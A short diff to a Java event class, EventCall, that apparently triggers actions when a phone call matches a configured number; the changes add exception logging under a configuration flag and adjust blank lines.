@@ -49,9 +49,14 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 				Check.log(TAG + " exitAction: " + actionOnExit + " number: \"");//$NON-NLS-1$ //$NON-NLS-2$
 			}
 		} catch (final ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
 			}
+
 			return false;
 		}
 
@@ -70,6 +75,7 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 			if (number.length() == 0) {
 				inCall = true;
 				onEnter();
+
 				return 0;
 			}
 
@@ -77,6 +83,7 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 			if (c.getNumber().contains(number)) {
 				inCall = true;
 				onEnter();
+
 				return 0;
 			}
 
@@ -92,6 +99,4 @@ public class EventCall extends BaseEvent implements Observer<Call> {
 
 		return 0;
 	}
-
-
 }
